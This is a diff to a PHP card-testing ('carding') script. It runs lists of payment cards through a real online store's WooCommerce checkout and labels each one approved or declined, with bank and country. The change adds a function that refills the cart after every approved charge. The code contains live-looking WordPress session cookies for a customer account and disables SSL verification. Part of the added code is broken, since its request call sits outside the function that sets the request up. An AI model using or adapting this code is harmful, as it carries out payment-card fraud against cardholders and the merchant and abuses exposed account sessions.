@@ -146,6 +146,41 @@ $dbtime = substr(str_shuffle(str_repeat("0123456789", 10)), 0, 10);
 // echo $counters2;
 
 
+function updatecart(){
+
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://airstreamsupplycompany.com/wp-admin/admin-ajax.php');
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+   // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
+   // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
+// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'accept: application/json, text/plain, */*',
+'accept-encoding: gzip, deflate, br',
+'accept-language: en-US,en;q=0.9',
+'content-type: application/x-www-form-urlencoded',
+'cookie: wordpress_57c55ae70790bf394bcb2a7313c0b037=pubgkitt.u%40gmail.com%7C1592727982%7CRgZ7FQBMjE2zhlRXBWwnukm9v0GVhSByCWEbKa0har5%7C73b56130f108e7166ee0fff069ff4e84d70d9d11c3aa02ca543c9ae2db58462e; __cfduid=df5372fcdee78465656bb375d67509c131591513584; reduxPersistIndex=[%22persist:Airstream_Ecommerce_undefined_session%22]; tk_ai=woo%3Amy1J4AKRU55%2FBiz1dRU5ybIN; wordpress_logged_in_57c55ae70790bf394bcb2a7313c0b037=pubgkitt.u%40gmail.com%7C1592727982%7CRgZ7FQBMjE2zhlRXBWwnukm9v0GVhSByCWEbKa0har5%7C46f5f04f803cd95748af0da6c1c31872324017fb1b96fc0a337ed068f3208131; wp_woocommerce_session_57c55ae70790bf394bcb2a7313c0b037=2659%7C%7C1591691080%7C%7C1591687480%7C%7Cae1c2b7c25705f954be8e5c77531ba99; persist%3AAirstream_Ecommerce_undefined_session={%22loggedIn%22:%22true%22%2C%22username%22:%22%5C%22Vincent%5C%22%22%2C%22totalItemsInCart%22:%220%22%2C%22_persist%22:%22{%5C%22version%5C%22:-1%2C%5C%22rehydrated%5C%22:true}%22}',
+'origin: https://airstreamsupplycompany.com',
+'referer: https://airstreamsupplycompany.com/products/interstate-carabiner-d-style-keychain',
+'user-agent: '.$browser.''
+));
+
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=woocommerce_add_to_cart&product_id=6449&quantity=1&nonce=acdd747418');
+
+}
+$update = curl_exec($ch);
+
+$hash = trim(strip_tags(getstr($update,'"cart_hash":"','"')));
 
 //============================================================================================================================================================
  // Request 1
@@ -227,7 +262,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept-encoding: gzip, deflate, br',
 'accept-language: en-US,en;q=0.9',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: __cfduid=df5372fcdee78465656bb375d67509c131591513584; reduxPersistIndex=[%22persist:Airstream_Ecommerce_undefined_session%22]; tk_ai=woo%3Amy1J4AKRU55%2FBiz1dRU5ybIN; wordpress_logged_in_57c55ae70790bf394bcb2a7313c0b037=pubgkitt.u%40gmail.com%7C1592727982%7CRgZ7FQBMjE2zhlRXBWwnukm9v0GVhSByCWEbKa0har5%7C46f5f04f803cd95748af0da6c1c31872324017fb1b96fc0a337ed068f3208131; wp_woocommerce_session_57c55ae70790bf394bcb2a7313c0b037=2659%7C%7C1591691080%7C%7C1591687480%7C%7Cae1c2b7c25705f954be8e5c77531ba99; persist%3AAirstream_Ecommerce_undefined_session={%22loggedIn%22:%22true%22%2C%22username%22:%22%5C%22Vincent%5C%22%22%2C%22totalItemsInCart%22:%220%22%2C%22_persist%22:%22{%5C%22version%5C%22:-1%2C%5C%22rehydrated%5C%22:true}%22}; woocommerce_items_in_cart=1; woocommerce_cart_hash=97d0875ca548471533ae727af3f22d8d',
+'cookie: __cfduid=df5372fcdee78465656bb375d67509c131591513584; reduxPersistIndex=[%22persist:Airstream_Ecommerce_undefined_session%22]; tk_ai=woo%3Amy1J4AKRU55%2FBiz1dRU5ybIN; wordpress_logged_in_57c55ae70790bf394bcb2a7313c0b037=pubgkitt.u%40gmail.com%7C1592727982%7CRgZ7FQBMjE2zhlRXBWwnukm9v0GVhSByCWEbKa0har5%7C46f5f04f803cd95748af0da6c1c31872324017fb1b96fc0a337ed068f3208131; wp_woocommerce_session_57c55ae70790bf394bcb2a7313c0b037=2659%7C%7C1591691080%7C%7C1591687480%7C%7Cae1c2b7c25705f954be8e5c77531ba99; persist%3AAirstream_Ecommerce_undefined_session={%22loggedIn%22:%22true%22%2C%22username%22:%22%5C%22Vincent%5C%22%22%2C%22totalItemsInCart%22:%220%22%2C%22_persist%22:%22{%5C%22version%5C%22:-1%2C%5C%22rehydrated%5C%22:true}%22}; woocommerce_items_in_cart=1; woocommerce_cart_hash='.$hash.'',
 'origin: https://airstreamsupplycompany.com',
 'referer: https://airstreamsupplycompany.com/checkout/',
 'user-agent: '.$browser.''
@@ -255,6 +290,8 @@ $message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-e
 
 // /////////////////// RESULT ////////////////////////////////////
 if(strpos($result,'"result":"success"')){
+  updatecart();
+
       echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$result.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' |  '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
 
    }
@@ -266,9 +303,6 @@ else {
 
          echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' |  '.$type.' | cat- '.$category.'</font></b></font></td></tr>';
 
-
-
-// updatecart();
 }
 
 curl_close($curl);
